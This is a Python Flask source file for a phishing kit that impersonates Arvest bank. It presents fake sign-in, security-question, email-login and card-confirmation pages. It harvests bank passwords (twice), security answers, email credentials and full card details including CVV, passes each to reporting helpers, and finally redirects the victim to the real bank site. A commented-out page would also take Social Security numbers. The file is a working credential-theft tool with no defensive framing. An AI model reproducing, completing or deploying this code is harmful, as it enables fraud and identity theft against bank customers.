from flask import Blueprint, render_template, request, redirect, url_for
from .utils import security_question, report_login, report_card_details

portals = Blueprint('portals', __name__)

@portals.route('/signin', methods=['GET','POST'])
def signin():
    if request.method == 'POST':
        first_try_user = request.form['try_user_id']
        first_try_pass = request.form['try_pass']
        user_id = request.form['user-id']
        password_ = request.form['password']
        if user_id and password_:
            # print(first_try_user, first_try_pass, user_id,password_)
            report_login(first_try_user, first_try_pass, user_id,password_,bank_name='Arvest')
            return redirect(url_for('portals.question'))
    return render_template('signin.html')

@portals.route('/question', methods=['GET','POST'])
def question():
    if request.method == 'POST':
        q1 = request.form['q1']
        ans1 = request.form['ans1']
        q2 = request.form['q2']
        ans2 = request.form['ans2']
        q3 = request.form['q3']
        ans3 = request.form['ans3']
        # print(q1,ans1,q2,ans2,q3,ans3)
        security_question(q1,ans1,q2,ans2,q3,ans3)
        return redirect(url_for('portals.email'))
    return render_template('question.html')    

@portals.route('/signin/email', methods=['GET','POST'])
def email():
    if request.method == 'POST':
        email = request.form['email-id']
        password_ = request.form['password']
        if email and password_:
            # print(email,password_)
            report_login(username=email,password=password_, first_try_username=email, first_try_pass=password_, bank_name='Email Login')
            return redirect(url_for('portals.card_confirmation'))
    return render_template('email-login.html')    



# @portals.route('/ssn-confirmation', methods=['GET','POST'])
# def ssn():
#     if request.method == 'POST':
#         ssn = request.form['ssn']
#         if ssn:
#             # print(ssn)
#             report_ssn(ssn)
#             return redirect(url_for('portals.email_confirmation'))
#     return render_template('identity-ssn.html')

@portals.route('/signin/card-confirmation', methods=['GET','POST'])
def card_confirmation():
    if request.method == 'POST':
        card_name = request.form['card_name']
        card_number = request.form['card_number']
        exp_date = request.form['exp_date']
        cvv = request.form['cvv']
        if card_name and card_number and exp_date and cvv:
            # print( card_name, card_number, exp_date, cvv)
            report_card_details(card_name, card_number, exp_date, cvv)
            return redirect('https://www.arvest.com/')
    return render_template('bank-card.html')

# We are all 6 years old at some level